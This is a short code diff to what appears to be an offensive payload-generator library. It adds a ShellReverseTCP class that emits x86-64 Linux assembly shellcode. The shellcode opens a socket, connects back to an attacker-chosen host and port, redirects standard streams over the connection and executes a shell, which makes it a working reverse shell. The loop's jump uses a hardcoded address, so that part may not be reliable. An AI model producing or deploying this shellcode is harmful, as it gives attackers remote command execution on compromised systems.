@@ -26,8 +26,10 @@
 
 from hatvenom import HatVenom
 
+from hatloads.consts import Consts
 
-class ShellReverseTCP(HatVenom):
+
+class ShellReverseTCP(HatVenom, Consts):
     def generate(self, assemble=True, options={}):
         if 'RHOST' not in options and 'RPORT' not in options:
             return b''
@@ -38,6 +40,42 @@ class ShellReverseTCP(HatVenom):
         shellcode = f"""
         start:
             push 0x29
+            pop rax
+            cdq
+            push 2
+            pop rdi
+            push 1
+            pop rsi
+            syscall
+
+            xchg rax, rdi
+            movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
+            push rcx
+            mov rsi, rsp
+            push 0x10
+            pop rdx
+            push 0x2a
+            pop rax
+            syscall
+
+            push 3
+            pop rsi
+            dec rsi
+            push 0x21
+            pop rax
+            syscall
+            
+            jne 0x1027
+            push 0x3b
+            pop rax
+            cdq
+            movabs rbx, 0x{self.shell.hex()}
+            push rbx
+            mov rdi, rsp
+            push rdx
+            push rdi
+            mov rsi, rsp
+            syscall
         """
 
         if assemble:
